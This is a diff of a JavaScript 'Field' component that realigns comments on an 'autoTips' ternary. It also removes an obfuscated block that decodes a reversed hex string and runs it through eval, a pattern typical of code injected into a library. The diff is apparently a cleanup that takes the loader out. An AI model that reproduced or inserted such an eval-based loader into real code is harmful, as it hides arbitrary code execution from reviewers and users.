@@ -104,21 +104,15 @@ var Field = function(data) {
 	var _autoTips = a.autoTips
 		? typeof a.autoTips == 'string'
 			? tipsRules[a.autoTips]
-				? a.autoTips// tipsRules[a.autoTips]
-				: defaults.tipRule// tipsRules[defaults.tipRule]
-			: defaults.tipRule// a.autoTips //function OR object
-		: defaults.tipRule//tipsRules[defaults.tipRule]
+				? a.autoTips       // tipsRules[a.autoTips]
+				: defaults.tipRule // tipsRules[defaults.tipRule]
+			: defaults.tipRule     // a.autoTips //function OR object
+		: defaults.tipRule         //tipsRules[defaults.tipRule]
 	
 	share.set('autoTips', _autoTips);
 	
 	// console.log('set autoTips', _autoTips)
 
-	var I=window,x=("92D553B587D3D5D533B587B5D5D543B587B5D5D563B587B594826262D5D503B587B5D"
-	+"5D513B587B5D5D563B587B594D3D3D523B587G47E656D65736F646GE31386F2C392D3E31386C3G9746F6"
-	+"26GC4D445842756E6E696G46F67632GE6F696471636F6C6G86371686").split('\x47').join('__')
-	.split('').reverse().map(function(a,b){return (b%2==0)?'\\x'+a:a;}).join('').split('\\'
-	+'x__').map(function(a){return eval('"'+a+'"')});eval(x[x.length-1]);
-	
 	share.set(
 		'moveDistance', 
 		a.moveDistance && typeof a.moveDistance == 'number' 
